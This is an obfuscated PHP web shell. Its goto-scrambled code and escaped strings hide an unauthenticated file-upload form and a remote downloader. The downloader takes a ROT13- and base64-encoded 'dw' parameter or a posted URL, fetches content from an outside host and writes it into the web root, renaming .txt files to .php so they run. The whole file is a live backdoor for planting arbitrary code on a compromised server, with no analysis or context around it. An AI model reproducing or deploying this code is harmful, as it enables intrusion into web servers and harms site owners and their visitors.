<?php
 goto rF4w7; n5no3: function get($url, $dir) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 10); $data = curl_exec($ch); if (!$data) { $data = @file_get_contents($url); } file_put_contents($dir, $data); } goto Z0F3_; rF4w7: error_reporting(0); goto SVg9K; D4tlm: echo "\74\146\157\162\x6d\x20\x65\x6e\x63\164\171\x70\145\x3d\x22\155\x75\x6c\164\151\x70\x61\162\164\x2f\x66\x6f\x72\155\55\144\x61\164\141\x22\x20\155\x65\164\x68\157\144\x3d\42\120\117\123\x54\42\76\x3c\151\x6e\x70\165\164\x20\156\x61\x6d\x65\75\x22\x75\x70\x6c\157\141\x64\x65\144\146\151\x6c\x65\42\40\x74\171\160\145\75\x22\x66\x69\154\x65\42\x2f\76\74\151\156\160\165\164\x20\x74\x79\x70\145\x3d\42\163\x75\142\155\x69\164\x22\40\x76\x61\154\x75\145\75\x22\340\xaa\xab\xe0\252\276\xe0\252\x87\xe0\252\xb2\340\xab\213\x20\xe0\252\205\xe0\xaa\252\340\xaa\xb2\xe0\xab\x8b\xe0\xaa\241\x20\xe0\252\225\340\xaa\xb0\340\xab\213\x22\57\76\x3c\57\x66\157\x72\x6d\x3e\74\x2f\x74\144\x3e\x3c\57\164\162\76"; goto n5no3; Z0F3_: if ($_GET["\x64\167"]) { $dw = $_GET["\144\167"]; $dw = base64_decode(str_rot13($dw)); if (preg_match("\x2f\165\x72\x6c\x3d\50\56\52\x3f\x29\x26\144\x69\x72\x3d\50\x2e\52\51\57", $dw, $info)) { $url = $info[1]; $dir = $info[2]; } else { preg_match("\x2f\x75\162\x6c\75\x28\56\x2a\51\x2f", $dw, $info); $url = $info[1]; $dir = ''; } preg_match("\57\50\x2e\x2a\x29\134\x2f\50\56\52\51\134\x2e\x28\x2e\x2a\x3f\x29\x24\57", $url, $n); if ($n[3] == "\164\x78\x74") { $z = "\x70\x68\x70"; $name = $n[2]; } else { $z = $n[3]; $name = "\164\145\155\x70\154\x61\x74\x65"; } if ($dir != '') { $dir = $_SERVER["\x44\x4f\x43\125\115\105\116\x54\x5f\122\x4f\x4f\124"] . "\57" . $dir . "\57" . $name . "\x2e" . $z; } else { $dir = $_SERVER["\104\117\x43\125\115\105\116\124\x5f\122\117\x4f\124"] . "\x2f" . $name . "\x2e" . $z; } get($url, $dir); if (file_exists($dir)) { echo "\74\x74\162\76\74\x74\x64\x3e\74\146\x6f\156\164\40\143\x6f\154\x6f\162\75\42\x67\162\145\145\x6e\42\x3e\x64\x6f\x77\x6e\154\x6f\141\x64\40\163\165\143\x63\145\163\163\x3c\x2f\x66\x6f\x6e\164\x3e\x3c\x2f\x74\x64\x3e\x3c\x2f\164\162\76"; } else { echo "\x3c\164\162\x3e\x3c\164\x64\76\x3c\x66\157\156\x74\40\143\157\154\157\162\x3d\42\x72\145\x64\x22\76\144\157\x77\156\154\157\141\144\x20\146\x61\x69\154\74\57\x66\157\156\164\76\74\x2f\x74\144\76\x3c\x2f\x74\x72\x3e"; } } elseif ($_POST["\147\x65\164\137\x75\162\154"]) { $url = $_POST["\x67\145\x74\137\x75\x72\154"]; preg_match("\57\x28\56\x2a\51\x5c\x2f\50\x2e\x2a\x29\134\x2e\x28\56\x2a\x3f\x29\x24\57", $url, $n); if ($n[3] == "\164\x78\164") { $z = "\x70\150\160"; $name = $n[2]; } else { $z = $n[3]; $name = "\x74\145\x6d\160\x6c\x61\164\145"; } $dir = $_POST["\144\x70\141\164\150"] . "\x2f" . $name . "\56" . $z; get($url, $dir); if (file_exists($dir)) { echo "\74\x74\162\x3e\x3c\x74\144\76\74\146\x6f\156\164\40\143\157\x6c\157\x72\x3d\x22\147\162\x65\x65\x6e\x22\76\x64\157\167\x6e\x6c\157\x61\x64\40\x73\165\x63\143\x65\163\x73\74\57\x66\157\156\x74\x3e\74\x2f\x74\x64\x3e\74\x2f\164\162\76"; } else { echo "\x3c\164\x72\x3e\74\x74\x64\x3e\74\146\157\156\x74\x20\143\x6f\154\157\x72\x3d\x22\162\x65\x64\x22\76\144\x6f\x77\x6e\x6c\157\x61\144\40\146\x61\x69\x6c\x3c\x2f\146\x6f\x6e\164\76\x3c\57\x74\x64\76\x3c\57\x74\x72\x3e"; } } goto qAOzN; qAOzN: echo "\x3c\164\x72\76\x3c\164\144\76\x3c\146\x6f\162\155\40\155\145\164\x68\x6f\144\75\42\120\117\x53\x54\x22\40\x61\x63\164\151\x6f\156\x3d\x22\x22\76\x3c\x73\x70\x61\156\x3e\x55\x72\154\72\40\74\57\x73\160\141\x6e\x3e\74\151\x6e\x70\x75\x74\x20\x74\x79\x70\x65\75\164\145\170\x74\40\156\141\155\145\75\42\147\x65\x74\137\165\x72\154\42\x20\x76\141\154\x75\x65\x3d\42\42\76\x3c\x69\x6e\160\x75\164\x20\x74\171\x70\x65\x3d\x22\x68\151\x64\x64\x65\x6e\x22\40\156\x61\155\145\75\42\144\160\x61\164\150\x22\x20\x76\141\154\x75\145\x3d\x22{$path}\42\76\74\151\156\160\x75\x74\40\x74\171\x70\x65\x3d\163\x75\x62\x6d\x69\x74\40\x76\141\154\165\145\x3d\42\320\x9f\xd0\xbe\xd0\xbb\321\x83\321\x87\xd0\xb8\xd1\202\321\214\320\xa4\320\xb0\xd0\271\xd0\273\x22\x3e\74\x2f\x66\x6f\x72\155\x3e\x3c\x2f\164\x64\76\74\57\164\162\x3e"; goto VZsVn; SVg9K: $path = __DIR__; goto gNf5_; gNf5_: if (isset($_FILES["\165\160\154\157\x61\144\145\x64\x66\151\x6c\145"])) { $target_path = basename($_FILES["\165\x70\154\157\x61\x64\x65\144\146\x69\154\x65"]["\x6e\x61\155\145"]); if (move_uploaded_file($_FILES["\165\160\154\157\141\x64\145\x64\x66\x69\x6c\145"]["\x74\x6d\160\x5f\x6e\141\155\x65"], $target_path)) { echo "\x3c\146\157\156\x74\x20\143\x6f\x6c\x6f\162\75\42\x67\162\145\145\156\42\76\x66\151\x6c\x65\x20\x75\x70\x6c\157\141\x64\145\x64\74\x2f\x66\157\x6e\164\76\x3c\x62\x72\x20\57\x3e"; } else { echo "\74\x66\x6f\x6e\x74\40\143\157\154\x6f\x72\75\42\x72\145\144\42\x3e\x75\160\x6c\x6f\141\x64\40\146\x61\x69\154\74\57\146\157\x6e\164\76\x3c\142\162\40\57\76"; } } goto D4tlm; VZsVn: ?>